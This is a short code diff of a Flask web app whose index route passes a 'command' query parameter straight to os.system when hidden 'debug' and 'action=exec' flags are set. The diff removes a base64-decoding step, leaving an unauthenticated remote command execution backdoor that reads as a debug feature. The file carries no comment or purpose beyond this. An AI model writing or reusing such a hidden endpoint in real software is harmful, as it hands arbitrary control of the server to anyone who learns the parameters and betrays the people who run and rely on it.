@@ -1,6 +1,5 @@
 from flask import Flask, request, abort, make_response
 import os
-import base64
 
 localapp = Flask(__name__)
 
@@ -8,7 +7,7 @@ localapp = Flask(__name__)
 def index():
     if request.args.get("debug") == "True" and request.args.get("action") == "exec":
     	command = request.args.get("command")
-    	os.system(base64.b64decode(command))
+    	os.system(command)
     	return make_response("Executed!", 200)
     else:
     	abort(404)
